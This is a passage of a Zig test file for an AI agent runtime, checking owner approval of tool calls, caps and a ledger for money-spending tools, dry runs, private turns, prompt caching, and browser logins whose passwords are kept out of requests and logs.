    try f.e.script(2, try toolReplyOf(&f, "tu_2", "shell", try std.fmt.allocPrint(a, "{{\"command\":\"echo {s}\"}}", .{try pad(&f, max_question)})));
    try f.e.script(3, model.textReply("done"));
    f.answer = .deny;
    const r = try f.say("run them");
    freeResult(&f.run, r);
    try t.expectEqualStrings(try std.fmt.allocPrint(a, "shell: {s}", .{long}), f.last_what);
    // the second is too long to show: refused without asking
    try t.expectEqual(1, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(3), "too long to ask the owner") != null);
}

test "mcp_tool_asks_by_default" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, false);
    defer s.deinit();
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\"}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("echo");
    freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    try t.expect(f.last_allow_day);
}

test "money_is_asked_every_time_and_never_granted" {
    var f: Fix = undefined;
    try f.init("allow mcp *\n");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.answer = .day; // even if the owner somehow answers "24 h"
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"buy\",\"amount\":5}"));
    try f.e.script(2, model.toolReply("tu_2", "fake__echo", "{\"text\":\"buy\",\"amount\":5}"));
    try f.e.script(3, model.textReply("Bought twice."));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(2, f.asked);
    try t.expect(!f.last_allow_day);
    try t.expectEqual(0, f.grants.items.items.len);
}

test "money_caps_refuse_before_asking" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.money = .{ .max_per_call = 100, .max_per_day = 80 };
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"big\",\"amount\":150}"));
    try f.e.script(2, model.toolReply("tu_2", "fake__echo", "{\"text\":\"ok\",\"amount\":50}"));
    try f.e.script(3, model.toolReply("tu_3", "fake__echo", "{\"text\":\"again\",\"amount\":\"50\"}"));
    try f.e.script(4, model.toolReply("tu_4", "fake__echo", "{\"text\":\"no amount\"}"));
    try f.e.script(5, model.textReply("done"));
    const r = try f.say("trade");
    freeResult(&f.run, r);
    try t.expectEqual(1, f.asked); // only the 50 within both caps
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "over the cap of 100 per call") != null);
    try t.expect(std.mem.indexOf(u8, try f.e.request(4), "over the cap of 80 per day") != null);
    try t.expect(std.mem.indexOf(u8, try f.e.request(5), "no amount") != null);
}

test "money_dry_run_does_not_call_the_tool" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.dry_run = true;
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"env\",\"amount\":1}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    const req = try f.e.request(2);
    try t.expect(std.mem.indexOf(u8, req, "dry run: would call fake/echo") != null);
    try t.expect(std.mem.indexOf(u8, req, "home=") == null); // the server never ran it
    try t.expectEqual(@as(f64, 0), f.ledger.sum());
}

test "the_money_question_says_whether_the_call_is_made" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    var sw: Switches = .{};
    f.run.switches = &sw;
    f.answer = .deny;
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":1}"));
    try f.e.script(2, model.textReply("ok"));
    var r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expect(std.mem.endsWith(u8, f.last_what, "\nDry run is off: this call is made."));
    sw.dry_run.store(true, .release);
    try f.e.script(3, model.toolReply("tu_2", "fake__echo", "{\"text\":\"x\",\"amount\":1}"));
    try f.e.script(4, model.textReply("ok"));
    r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expect(std.mem.endsWith(u8, f.last_what, "\nDry run is on: this call is not made."));
}

test "private_switched_on_during_a_turn_covers_the_rest_of_it" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    var sw: Switches = .{};
    f.run.switches = &sw;
    f.on_ask = &sw.private;
    try f.e.script(1, model.toolReply("tu_1", "shell", "{\"command\":\"echo zebra-private-word\"}"));
    try f.e.script(2, model.textReply("done"));
    const r = try f.say("run it");
    freeResult(&f.run, r);
    const lt = try f.logText();
    try t.expect(std.mem.indexOf(u8, lt, "\"kind\":\"tool\"") != null);
    try t.expect(std.mem.indexOf(u8, lt, "zebra-private-word") == null);
}

test "money_in_scheduled_runs_only_when_switched_on" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.scheduled = true;
    f.run.asker = null;
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"one\",\"amount\":1}"));
    try f.e.script(2, model.textReply("refused"));
    var r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "not moved in scheduled runs") != null);
    f.run.money = .{ .scheduled = true, .max_per_call = 10 };
    try f.e.script(3, model.toolReply("tu_2", "fake__echo", "{\"text\":\"two\",\"amount\":2}"));
    try f.e.script(4, model.textReply("bought"));
    r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(4), "two") != null);
    try t.expectEqual(@as(f64, 2), f.ledger.sum());
}

test "helpers_never_get_money_tools" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    const s = try withMcp(&f, true);
    defer s.deinit();
    try f.e.script(1, model.toolReply("tu_1", "delegate", "{\"tasks\":[{\"task\":\"buy\",\"tools\":[\"mcp\",\"money\"]}]}"));
    try f.e.script(2, model.textReply("helper done"));
    try f.e.script(3, model.textReply("ok"));
    const r = try f.say("go");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "fake__echo") == null);
}

test "money_is_reserved_while_asked_and_released_when_denied" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.money = .{ .max_per_day = 100 };
    f.answer = .deny;
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":30}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(@as(f64, 30), f.ledger_at_ask);
    try t.expectEqual(@as(f64, 0), f.ledger.sum());
}

test "money_call_that_fails_still_counts" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    try f.e.script(1, model.toolReply("tu_1", "fake__fail", "{\"amount\":7}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(@as(f64, 7), f.ledger.sum());
}

test "unattended_money_needs_a_cap" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.scheduled = true;
    f.run.asker = null;
    f.run.money = .{ .scheduled = true };
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":1}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "needs max_per_call or max_per_day") != null);
}

test "amount_field_can_differ_per_tool" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.money = .{ .max_per_call = 10 };
    _ = try fakeTools(&f, s, "money = echo, fail\namount = echo:amount, fail:none\n");
    // like cancel_order: no amount, still allowed with a cap set
    try f.e.script(1, model.toolReply("tu_1", "fake__fail", "{}"));
    try f.e.script(2, model.toolReply("tu_2", "fake__echo", "{\"text\":\"x\"}"));
    try f.e.script(3, model.textReply("ok"));
    const r = try f.say("cancel then buy");
    freeResult(&f.run, r);
    try t.expectEqual(1, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(3), "no amount in the field \\\"amount\\\"") != null);
}

test "money_tool_without_an_amount_field_is_refused_under_a_cap" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.money = .{ .max_per_day = 100 };
    // mcp.ini lists the money tools but says nothing about their amounts
    const offer = try fakeTools(&f, s, "money = echo, fail\n");
    // the owner is told when the server starts (and in /status)
    try t.expect(std.mem.indexOf(u8, offer.notes, "fake: echo has no amount field in mcp.ini") != null);
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"buy\",\"amount\":500}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(0, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "no amount field") != null);
    try t.expectEqual(@as(f64, 0), f.ledger.sum());
}

test "a_money_tool_the_server_does_not_list_stops_the_server" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, false);
    defer s.deinit();
    // a typo: the real tool would be offered as an ordinary MCP tool
    const offer = try fakeTools(&f, s, "money = echo, ech\namount = amount\n");
    try t.expectEqual(0, offer.tools.len);
    try t.expect(std.mem.indexOf(u8, offer.refused.?, "money = names \"ech\", which is not one of its tools") != null);
    try t.expectEqual(null, (try fakeTools(&f, s, "money = echo\namount = amount\n")).refused);
}

test "mcp_tool_names_never_collide" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const a = arena_state.allocator();
    const tool = struct {
        fn of(server: []const u8, name: []const u8) mcp.Tool {
            return .{ .server = server, .name = name, .description = "", .schema_json = "{}" };
        }
    }.of;
    const long: [62]u8 = @splat('x'); // a__ and this: 65
    // only the tool list is read
    var one: mcp.Server = undefined;
    one.name = "a_";
    one.tool_list = try a.dupe(mcp.Tool, &.{ tool("a_", "b"), tool("a_", "b") });
    var two: mcp.Server = undefined;
    two.name = "a";
    two.tool_list = try a.dupe(mcp.Tool, &.{ tool("a", "_b"), tool("a", &long), tool("a", "c") });
    const cfg: mcp.ServerConfig = .{ .name = "a", .command = "x", .secrets = &.{}, .money = &.{} };
    const first = try mcpTools(a, &one, cfg, .{}, &.{});
    // the server listed b twice: the model gets it once
    try t.expectEqual(1, first.tools.len);
    try t.expectEqualStrings("a___b", first.tools[0].def.name);
    // a's _b is also "a___b": the first server's keeps the name
    const second = try mcpTools(a, &two, cfg, .{}, first.tools);
    try t.expectEqual(1, second.tools.len);
    try t.expectEqualStrings("a__c", second.tools[0].def.name);
    try t.expect(std.mem.indexOf(u8, second.notes, "a: _b left out: another tool already has the name a___b") != null);
    try t.expect(std.mem.indexOf(u8, second.notes, "is longer than 64 characters") != null);
}

test "a_server_can_have_its_own_money_caps" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    // config.ini's [money] is the default; the server's section says less
    f.run.money = .{ .max_per_call = 100 };
    _ = try fakeTools(&f, s, "money = echo, fail\namount = amount\nmax_per_call = 10\n");
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":20}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(0, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "over the cap of 10 per call") != null);
}

test "each_server_keeps_its_own_day_total" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const a = f.e.arena.allocator();
    const s = try withMcp(&f, true);
    defer s.deinit();
    const s2 = try startFake(&f, "other");
    defer s2.deinit();
    const cfgs = try mcp.parseConfig(a, "[other]\ncommand = x\nmoney = echo\namount = amount\n");
    const second = try mcpTools(a, s2, cfgs[0], f.run.money, f.mcp_tools);
    f.mcp_tools = try std.mem.concat(a, McpTool, &.{ f.mcp_tools, second.tools });
    f.run.mcp = f.mcp_tools;
    f.run.money = .{ .max_per_day = 50 };
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":30}"));
    try f.e.script(2, model.toolReply("tu_2", "other__echo", "{\"text\":\"y\",\"amount\":30}"));
    try f.e.script(3, model.toolReply("tu_3", "fake__echo", "{\"text\":\"z\",\"amount\":30}"));
    try f.e.script(4, model.textReply("ok"));
    const r = try f.say("buy on both");
    freeResult(&f.run, r);
    // 30 on each server is within its own 50; a second 30 on one is not
    try t.expectEqual(2, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(4), "over the cap of 50 per day (30 so far today)") != null);
}

test "money_ledger_keeps_a_total_per_server_and_reads_the_old_file" {
    var tmp = t.tmpDir(.{});
    defer tmp.cleanup();
    const dir = try tmp.dir.realPathFileAlloc(t.io, ".", t.allocator);
    defer t.allocator.free(dir);
    const p = try std.fs.path.join(t.allocator, &.{ dir, "money" });
    defer t.allocator.free(p);
    // the file from before totals were kept per server
    try tmp.dir.writeFile(t.io, .{ .sub_path = "money", .data = "20000 40\n" });
    var l: MoneyLedger = .{ .path = p };
    l.load(t.io);
    // that day's total counts for every server: none passes its cap anew
    try t.expectEqual(@as(f64, 40), l.spent("broker", 20000));
    try t.expectEqual(@as(f64, 40), l.spent("other", 20000));
    try t.expectEqual(@as(f64, 0), l.spent("broker", 20001));
    _ = try l.reserve(t.io, "broker", 20000, 5);
    var again: MoneyLedger = .{ .path = p };
    again.load(t.io);
    try t.expectEqual(@as(f64, 45), again.spent("broker", 20000));
    try t.expectEqual(@as(f64, 40), again.spent("other", 20000));
    // written whole to a new file that replaced the old one
    try t.expectError(error.FileNotFound, tmp.dir.statFile(t.io, "money.tmp", .{}));
    const first = try tmp.dir.readFileAlloc(t.io, "money", t.allocator, .limited(1024));
    defer t.allocator.free(first);
    try t.expectEqualStrings("* 20000 40\nbroker 20000 5\n", first);
    // a day that is over is not written again
    _ = try again.reserve(t.io, "broker", 20001, 1);
    const later = try tmp.dir.readFileAlloc(t.io, "money", t.allocator, .limited(1024));
    defer t.allocator.free(later);
    try t.expectEqualStrings("broker 20001 1\n", later);
}

test "the_money_record_holds_every_server_however_large_its_total" {
    var tmp = t.tmpDir(.{});
    defer tmp.cleanup();
    const dir = try tmp.dir.realPathFileAlloc(t.io, ".", t.allocator);
    defer t.allocator.free(dir);
    const p = try std.fs.path.join(t.allocator, &.{ dir, "money" });
    defer t.allocator.free(p);
    var l: MoneyLedger = .{ .path = p };
    var name_buf: [32]u8 = undefined;
    // with no cap nothing bounds an amount: the largest still fits
    for (0..MoneyLedger.max_servers) |i| _ = try l.reserve(t.io, try std.fmt.bufPrint(&name_buf, "server-{d}", .{i}), 20000, std.math.floatMax(f64));
    var again: MoneyLedger = .{ .path = p };
    again.load(t.io);
    try t.expectEqual(null, again.trouble());
    try t.expectEqual(std.math.floatMax(f64), again.spent("server-63", 20000));
}

test "a_money_record_that_cannot_be_trusted_refuses_money_calls" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    const a = f.e.arena.allocator();
    try f.e.tmp.dir.writeFile(t.io, .{ .sub_path = "money", .data = "fake 20000 5\nfake 20001 lots\n" });
    f.ledger.path = try std.fs.path.join(a, &.{ f.e.dir, "money" });
    f.ledger.load(t.io);
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":5}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(0, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "the money record (state/money) is damaged at line 2") != null);
    // one that cannot be read at all: the same
    var dir_ledger: MoneyLedger = .{ .path = f.e.dir };
    dir_ledger.load(t.io);
    try t.expect(std.mem.indexOf(u8, dir_ledger.trouble().?, "could not be read") != null);
    // none there yet is the first day, not trouble
    var fresh: MoneyLedger = .{ .path = try std.fs.path.join(a, &.{ f.e.dir, "nothing-yet" }) };
    fresh.load(t.io);
    try t.expectEqual(null, fresh.trouble());
}

test "a_release_for_a_day_that_is_over_leaves_today_alone" {
    var l: MoneyLedger = .{};
    // 30 counted late on day 100 while the owner is asked; after midnight
    // another run moves 5
    const late = try l.reserve(t.io, "broker", 100, 30);
    _ = try l.reserve(t.io, "broker", 101, 5);
    // the owner says no after midnight: day 100's 30 is taken back
    try l.release(t.io, "broker", late);
    try t.expectEqual(@as(f64, 5), l.spent("broker", 101));
    // a run that read the clock just before midnight but counts after
    // another run did counts toward the new day, not over it
    const behind = try l.reserve(t.io, "broker", 100, 2);
    try t.expectEqual(101, behind.day);
    try t.expectEqual(@as(f64, 7), l.spent("broker", 101));
    // and a total never goes below 0
    try l.release(t.io, "broker", .{ .day = 101, .amount = 50 });
    try t.expectEqual(@as(f64, 0), l.spent("broker", 101));
}

test "a_money_total_that_cannot_be_saved_refuses_the_call" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const s = try withMcp(&f, true);
    defer s.deinit();
    f.run.money = .{ .max_per_day = 100 };
    // its folder is not there: every save fails
    f.ledger.path = try std.fs.path.join(f.e.arena.allocator(), &.{ f.e.dir, "gone", "money" });
    try f.e.script(1, model.toolReply("tu_1", "fake__echo", "{\"text\":\"x\",\"amount\":5}"));
    try f.e.script(2, model.textReply("ok"));
    const r = try f.say("buy");
    freeResult(&f.run, r);
    try t.expectEqual(0, f.asked);
    try t.expect(std.mem.indexOf(u8, try f.e.request(2), "could not be saved") != null);
    // not counted either: it was not made
    try t.expectEqual(@as(f64, 0), f.ledger.sum());
}

test "private_turns_are_left_out_of_summaries" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.run.limits.conversation_bytes = 1000;
    for (1..9) |n| try f.e.script(@intCast(n), model.textReply("It will be sunny and mild with light wind in the afternoon."));
    for (0..6) |i| {
        f.run.private = i < 2;
        const r = try f.say(if (i < 2) "my zebra-secret is the code for the door at home ok" else "tell me about the weather in the mountains this weekend please");
        freeResult(&f.run, r);
    }
    try t.expect(f.conv.summary != null);
    try t.expect(std.mem.indexOf(u8, try f.e.request(7), "zebra-secret") == null);
}

test "system_prompt_is_the_same_across_turns" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try f.e.script(1, model.textReply("one"));
    try f.e.script(2, model.textReply("two"));
    var r = try f.say("first question");
    freeResult(&f.run, r);
    r = try f.say("second question");
    freeResult(&f.run, r);
    const a = f.e.arena.allocator();
    const v1 = jv.parse(a, try f.e.request(1)).?;
    const v2 = jv.parse(a, try f.e.request(2)).?;
    const s1 = try std.fmt.allocPrint(a, "{f}", .{std.json.fmt(jv.at(v1, &.{ "body", "system" }).?, .{})});
    const s2 = try std.fmt.allocPrint(a, "{f}", .{std.json.fmt(jv.at(v2, &.{ "body", "system" }).?, .{})});
    try t.expectEqualStrings(s1, s2);
    try t.expect(std.mem.indexOf(u8, s1, "Now:") == null);
    // the time goes with the newest message instead, and is not kept
    const msgs = jv.arr(jv.at(v2, &.{ "body", "messages" })).?;
    const last = try std.fmt.allocPrint(a, "{f}", .{std.json.fmt(msgs[msgs.len - 1], .{})});
    try t.expect(std.mem.indexOf(u8, last, "Now:") != null);
    // earlier turns are sent with the same text as before, so the cache holds
    const old = jv.arr(jv.get(jv.arr(jv.at(v1, &.{ "body", "messages" })).?[0], "content")).?;
    const now = jv.arr(jv.get(msgs[0], "content")).?;
    try t.expectEqual(old.len, now.len);
    for (old, now) |x, y| try t.expectEqualStrings(jv.str(jv.get(x, "text")).?, jv.str(jv.get(y, "text")).?);
}

/// The system prompt of the n-th model request, as sent.
fn systemOf(f: *Fix, n: u32) ![]const u8 {
    const a = f.e.arena.allocator();
    const v = jv.parse(a, try f.e.request(n)).?;
    return std.fmt.allocPrint(a, "{f}", .{std.json.fmt(jv.at(v, &.{ "body", "system" }).?, .{})});
}

test "the_stable_instructions_keep_memories_in_one_order" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const now = util.nowSeconds(t.io);
    // the tea item is older, so weaker, until the owner mentions it
    _ = try f.mem.add("likes green tea in the morning", null, now - 5 * 86400);
    _ = try f.mem.add("plays chess on weekends", null, now - 86400);
    try f.e.script(1, model.textReply("one"));
    try f.e.script(2, model.textReply("two"));
    var r = try f.say("hello");
    freeResult(&f.run, r);
    r = try f.say("green tea in the morning, as always");
    freeResult(&f.run, r);
    const s1 = try systemOf(&f, 1);
    try t.expect(std.mem.indexOf(u8, s1, "likes green tea") != null);
    // a mention changes strengths, not the cached start of the prompt
    try t.expectEqualStrings(s1, try systemOf(&f, 2));
}

test "the_stable_instructions_stay_the_same_through_a_turn" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    _ = try f.mem.add("plays chess on weekends", null, util.nowSeconds(t.io));
    try f.e.script(1, model.toolReply("tu_1", "remember", "{\"text\":\"prefers short answers without lists\"}"));
    try f.e.script(2, model.textReply("Noted."));
    const r = try f.say("keep answers short from now on");
    freeResult(&f.run, r);
    // what the turn saved is in the next turn's instructions, not this one's
    try t.expectEqualStrings(try systemOf(&f, 1), try systemOf(&f, 2));
}

test "helpers_get_the_rest_of_the_turn_not_a_new_one" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    try withHelpers(&f);
    f.run.limits.turn_seconds = 3;
    try f.e.script(1, "{\"delay_ms\":2000,\"content\":[{\"type\":\"tool_use\",\"id\":\"tu_1\",\"name\":\"delegate\",\"input\":{\"tasks\":[{\"task\":\"dig\",\"tools\":[\"recall\"]}]}}],\"stop_reason\":\"tool_use\"}");
    try f.e.script(2, "{\"delay_ms\":1500,\"content\":[{\"type\":\"tool_use\",\"id\":\"w1\",\"name\":\"recall\",\"input\":{\"query\":\"x\"}}],\"stop_reason\":\"tool_use\"}");
    try f.e.script(3, model.textReply("helper had more time than the turn"));
    try f.e.script(4, model.textReply("parent"));
    const r = try f.say("dig");
    freeResult(&f.run, r);
    try t.expect(f.e.server.modelRequests() <= 2);
}

test "web_is_offered_only_with_a_browser_and_never_to_helpers" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const a = f.e.arena.allocator();
    const names = struct {
        fn of(r: *const Run, arena: std.mem.Allocator) ![]const u8 {
            var out: std.ArrayList(u8) = .empty;
            for (try toolDefs(r, arena)) |d| try out.print(arena, "{s},", .{d.name});
            return out.items;
        }
    }.of;
    f.run.profiles_dir = "/tmp/profiles";
    try t.expect(std.mem.indexOf(u8, try names(&f.run, a), "web,") == null);
    f.run.env.browser = "/opt/chrome";
    f.run.logins = &.{.{ .name = "github-bot", .site = "github.com", .username = "agent-bot@example.com" }};
    const with = try names(&f.run, a);
    if (@import("builtin").os.tag == .windows) {
        try t.expect(std.mem.indexOf(u8, with, "web,") == null);
    } else {
        try t.expect(std.mem.indexOf(u8, with, "web,") != null);
        const defs = try toolDefs(&f.run, a);
        for (defs) |d| if (std.mem.eql(u8, d.name, "web")) {
            try t.expect(std.mem.indexOf(u8, d.description, "github-bot: github.com, username agent-bot@example.com") != null);
        };
    }
    try t.expect(std.mem.indexOf(u8, with, "login,") == null);
    var h = f.run;
    h.helper = true;
    try t.expect(std.mem.indexOf(u8, try names(&h, a), "web,") == null);
    // and asked for by name, a helper is refused
    try t.expect(!h.allows(.web));
}

test "web_fill_through_a_turn_keeps_the_value_out_of_requests_and_the_log" {
    var f: Fix = undefined;
    try f.init("");
    defer f.deinit();
    const a = f.e.arena.allocator();
    const browser = (try @import("cdp.zig").testBrowser(a)) orelse return error.SkipZigTest;
    try f.e.tmp.dir.createDirPath(t.io, "profiles");
    try f.e.tmp.dir.createDirPath(t.io, "tmp");
    const store: store_mod.Store = .{ .dir = try std.fs.path.join(a, &.{ f.e.dir, "secrets" }) };
    try store.put(t.io, "login-agent-password", "fake-Pass-7351!");
    f.run.env.browser = browser;
    f.run.env.tmp_root = try std.fs.path.join(a, &.{ f.e.dir, "tmp" });
    f.run.profiles_dir = try std.fs.path.join(a, &.{ f.e.dir, "profiles" });
    f.run.logins = &.{.{ .name = "agent", .site = "localhost", .username = "agent-bot" }};
    f.run.store = store;
    try f.e.tmp.dir.writeFile(t.io, .{ .sub_path = "pages/login.html", .data =
        \\<html><head><title>Sign in</title></head><body>
        \\<form id="f"><input id="user" aria-label="Email"><input id="pw" type="password" aria-label="Password"><button>Sign in</button></form>
        \\<p id="out"></p><script>
        \\document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault();
        \\  const v = document.getElementById('pw').value;
        \\  document.getElementById('out').textContent = (v === 'fake-Pass-7351!' ? 'welcome ' : 'wrong ') + document.getElementById('user').value + ' typed ' + v; });
        \\</script></body></html>
    });
    const open = try std.fmt.allocPrint(a, "{{\"content\":[{{\"type\":\"tool_use\",\"id\":\"tu_1\",\"name\":\"web\",\"input\":{{\"action\":\"open\",\"url\":\"http://localhost:{d}/page/login.html\",\"login\":\"agent\"}}}}],\"stop_reason\":\"tool_use\"}}", .{f.e.server.port});
    try f.e.script(1, open);
    try f.e.script(2, model.toolReply("tu_2", "web", "{\"action\":\"type\",\"ref\":1,\"text\":\"{login:agent.username}\"}"));
    try f.e.script(3, model.toolReply("tu_3", "web", "{\"action\":\"type\",\"ref\":2,\"text\":\"{login:agent.password}\",\"enter\":true}"));
    try f.e.script(4, model.textReply("Signed in."));
    const r = try f.say("sign in to the local site");
    defer freeResult(&f.run, r);
    try t.expectEqualStrings("Signed in.", r.text);
    // the owner was asked for the host and for the login, once each
    try t.expectEqual(2, f.asked);
    const req4 = try f.e.request(4);
    try t.expect(std.mem.indexOf(u8, req4, "welcome agent-bot typed [secret:login-agent-password]") != null);
    const lt = try f.logText();
    try t.expect(std.mem.indexOf(u8, lt, "\"event\":\"web fill\",\"login\":\"agent\"") != null);
    try t.expect(std.mem.indexOf(u8, lt, "{login:agent.password}") != null);
    for (1..5) |n| try t.expect(std.mem.indexOf(u8, try f.e.request(@intCast(n)), "fake-Pass-7351!") == null);
    try t.expect(std.mem.indexOf(u8, lt, "fake-Pass-7351!") == null);
    // the browser is gone with the turn
    try t.expect(f.run.web == null);
}
